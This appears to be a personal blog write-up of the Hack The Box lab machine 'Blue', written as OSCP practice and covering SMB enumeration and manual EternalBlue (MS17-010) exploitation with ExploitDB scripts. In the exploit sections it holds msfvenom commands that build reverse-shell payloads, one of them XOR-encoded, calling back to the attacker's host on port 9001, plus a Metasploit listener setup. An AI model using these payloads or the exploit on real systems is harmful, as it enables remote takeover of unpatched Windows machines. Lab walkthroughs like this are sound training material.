# Overview
In preparation for my OSCP, I have begun the long journey of completing all retired boxes, sorted by user-rated difficulty. Starting on the 1st May 2021, I am doing *Blue*.

*Note:* I am doing these retired boxes for now on our shared [SESH Account](https://www.hackthebox.eu/profile/451740) - because why pay for VIP twice?

I have been recommended to tackle these up to about a 6 in difficulty, as that is about the highest I should encounter in the exam. I don't expect to do them all by the time I sit my exam (aiming for mid-late August 2021), but I have to start somewhere. I expect to learn a lot, especially about Windows which is currently my weakest area.

**Box Details**

|IP|User-Rated Difficulty|OS|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.40|2.4|Windows (7)|2021-05-01|2021-05-01|

Blue has a difficulty rating of 2.4, the lowest on HTB:

---

The box was super simple - all it involved was enumerating the box to discover SMB was running and that the OS was Windows 7, vulnerable to Eternal Blue.

If you want to root it quickly, you can just use metasploit. I tried to manually exploit it, as Metasploit is not allowed on OSCP. It took an extra couple of hours to setup and get the right details, but was still pretty easy - just fiddly.

All in all it only took about 3 hours. Pretty slow going for a box of this difficulty, but I will hopefully speed that up - and now I'm equipped with a working Eternal Blue exploit I can reuse that on other boxes :)

## Ratings

I rated the box a 1 for both user and root - the exploit was simple really, made harder only by the fact I tried to do it manually. And there was no priv esc involved, as it dropped us straight in as `SYSTEM`.

## nmap

I started off with an `nmap` scan:

This shows a large number of RPC ports, and an SMB service on port 445.

OS Discovery reveals the operating system to be `Windows 7 Professional 7601`, and reveals a potential user `haris`

## Enumerating SMB

I tried a basic `smbmap` against the host to see if any domain name was exposed, then tried enumerating with null authentication:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ smbmap -H 10.10.10.40
[+] IP: 10.10.10.40:445	Name: 10.10.10.40

	Users                                             	READ ONLY
```

We can see we have access to the `Share` share and the `Users` share. Let's connect to them and see what's inside:

```bash

The `Users` share is particularly interesting, and contains some `NTUSER.DAT` files. These are Windows Profile files, and it seems it is potentially possible to [extract password information](https://www.fuzzysecurity.com/tutorials/18.html) from them. We'll make a note of this and potentially come back to these later if we run out of ideas.

### SMB Vulnerability Scan

I didn't do this when I first ran through the box, but the following command would have immediately raised that the box was vulnerable to Eternal Blue.

```bash

```

I found out it was vulnerable a different way, detailed in the next section.

# Eternal Blue

I decided to google the operating system, searching "windows 7 7601 exploit". This immediately revealed that the system was vulnerable to Eternal Blue.

Exploit DB reveals that it can be used for local privilege escalation: [https://www.exploit-db.com/exploits/47176](https://www.exploit-db.com/exploits/47176). So I perhaps needed to find another way to gain a foothold on the box first.

I took another look at Google, and there was a separate writeup from Rapid7 that suggested remote code execution over SMB:

[https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

This looked much more useful. It was available on `msfconsole`, but I decided to use the version from ExploitDB instead as metasploit is prohibited in OSCP.

## Editing the 42031 Exploit

I spent a while on this box editing the `windows/remote/42031.py` exploit on ExploitDB to work with `python2` on my machine. The exploit didn't end up working in the end, but the steps involved highlighted an important skill. If you want to skip to the [working exploit](#working-exploit---42315) you can.

Running `42301.py` with `python3` causes an issue with the `pack()` function:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python3 42031.py 10.10.10.40
Traceback (most recent call last):
  File "/home/mac/Documents/HTB/blue/42031.py", line 83, in <module>
    ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde
TypeError: can't concat str to bytes
```

This is because `pack()` behaves differently in `python2`, for which the script was written.

There are a couple of ways to fix this:
- convert the script to `python3`
- run the script with `python2`

I thought running it with `python2` was simplest:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42031.py 
Traceback (most recent call last):
  File "42031.py", line 2, in <module>
    from impacket import smb
ImportError: No module named impacket
```

However, the `python2` version of the `impacket` module was not installed. To get this, I had to install the `python2` version of `pip`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 get-pip.py
...[snip]...
Successfully installed pip-20.3.4 wheel-0.36.2
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ /home/mac/.local/bin/pip2.7 install impacket
...[snip]...
```

This fixed our issues, and we could now run our script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=9001 > shellcode
...[snip]...
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42031.py 10.10.10.40 shellcode
```

As I said, the script didn't end up working - but these debugging steps were useful to learn. [This thread](https://forum.hackthebox.eu/discussion/4061/need-help-with-manual-py-exploit-cant-concat-str-to-bytes) on the HTB forum was extremely useful.

## Working Exploit - 42315

I followed [this excellent tutorial](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/) on exploiting Eternal Blue manually. It used a different exploit, `windows/remote/42315.py`.

First, mirror the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ searchsploit -m windows/remote/42315.py
```

The exploit requires providing a working username. When I first tried the box I went with `null`, as I had used it to login before.

I tried the exploit multiple times before realising this was incorrect - in fact, earlier enumeration exposed that `guest` was the correct username to login with. I set this in the code:

![](/assets/images/blogs/Pasted image 20210501185951.png)

After setting the username, I downloaded `mysmb`, a required package:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

Then I ran a scan for named pipes on the box. These allow processes to communicate and specifying one is a crucial step of the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfconsole -q
msf6 > use auxiliary/scanner/smb/pipe_auditor 
msf6 auxiliary(scanner/smb/pipe_auditor) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf6 auxiliary(scanner/smb/pipe_auditor) > run

[+] 10.10.10.40:445       - Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \LSM_API_service, \ntsvcs, \plugplay, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc
[*] 10.10.10.40:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We can use `netlogon` as our pipe. Now let's rerun it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42315.py 10.10.10.40 netlogon

success controlling groom transaction

overwriting session security context

Done
```

So it worked! We don't have visibility over whether the file was created, as it is on the system itself not the SMB share. So now we have to modify the exploit to let us privesc.

We want to change the exploit to instead request a file from our box and execute it, using `service_exec()`.

First, we need to create a shell `.exe` file to upload to the box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.14.2 lport=9001 -e x64/xor -i 5 -f exe -o shell.exe

```

The first exploit I tried involved using `bitsadmin` to download the shell script from our box, as shown below:

However this would turn out not to work, and I eventually settled on using `smb_send_file` instead:

(*note:* I also changed the name of the `.exe` to `sc.exe`, in case `shell.exe` was getting caught by AV - this turned out not to be the issue, but that's why the filename has changed)

I used the `msf` handler, as per the tutorial:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:9001 
```

I spent a while debugging my payloads - I had made some syntax errors in my original attempt, which I've excluded because no one wants to read those.

My real issues turned out to be getting the username and delivery method incorrect, but most of my time was spent changing payloads as I believed that to be the issue at the time. A lesson was learnt here - go for the simplest payload first and make sure everything else is correct before you go changing it.

When all that was fixed I ran my exploit:

```bash

I got a shell!

It seems this pops out directly as system. So we can go and grab both flags.

There's the `pwned.txt` file from before...

```cmd
c:\>dir
dir
 Volume in drive C has no label.

And here are the flags:

That's the box!

# Key Lessons

Here are some of the key things I learned on this box:
- Basic enumeration of SMB servers with `smbmap`
- Null authentication, and authentication with specific named guest accounts
- Use of the nmap `--script vuln` flag to scan for vulnerabilities
- Important skills running Python scripts written in different versions of Python, and installing packets for specific Python versions
- Enumeration of named pipes using the Metasploit `auxiliary/scanner/smb/pipe_auditor` module
- Generation of shellcode for windows platforms with `msfvenom`
- Configuration of the Eternal Blue exploit to match the specific named pipes and SMB login credentials for a target machine

Although this is the easiest box on Hack the Box, it taught me an awful lot!
